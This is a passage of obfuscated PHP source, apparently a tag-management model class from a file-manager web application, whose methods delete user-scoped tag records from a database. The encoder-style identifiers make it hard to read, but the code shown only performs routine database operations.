$D²…¿öã³á[33], $D²…¿öã³á[1520] => 0); if ($this->where($DØ³­Š£‰)->find()) { return !1; } return $this->add($DØ³­Š£‰); } protected function removeFromTag($CÛä¬ÏùÆŠ, $BÌÇªøïç) { $E¢ÚÓŠ¬êË =& $_SERVER[ÍÓÖ€°å]; if (!Model($E¢ÚÓŠ¬êË[1703])->listData($BÌÇªøïç) || !Model($E¢ÚÓŠ¬êË[512])->pathInfo($CÛä¬ÏùÆŠ)) { return !1; } $fßÑ”Úò¬´ = array($E¢ÚÓŠ¬êË[1053] => USER_ID, $E¢ÚÓŠ¬êË[1871] => $BÌÇªøïç, $E¢ÚÓŠ¬êË[787] => $E¢ÚÓŠ¬êË[949], $E¢ÚÓŠ¬êË[1577] => $CÛä¬ÏùÆŠ); return $this->where($fßÑ”Úò¬´)->delete(); } protected function removeByTag($Eä¹¿ µ¸Á) { $CƒËÒ‚‹Ó =& $_SERVER[ÍÓÖ€°å]; if (!$Eä¹¿ µ¸Á) { return !1; } $a—Ş¢±°„Ô = array($CƒËÒ‚‹Ó[1053] => USER_ID, $CƒËÒ‚‹Ó[1871] => $Eä¹¿ µ¸Á); return $this->where($a—Ş¢±°„Ô)->delete(); } protected function removeBySource($B‘Í™Èß‚) { $CÇ“š†‰¨Ü =& $_SERVER[ÍÓÖ€°å]; $D‰ÂĞª’ƒˆ = array($CÇ“š†‰¨Ü[1053] => USER_ID, $CÇ“š†‰¨Ü[1577] => $B‘Í™Èß‚, $CÇ“š†‰¨Ü[1871] => array($CÇ“š†‰¨Ü[683], 0)); return $this->where($D‰ÂĞª’ƒˆ)->delete(); } }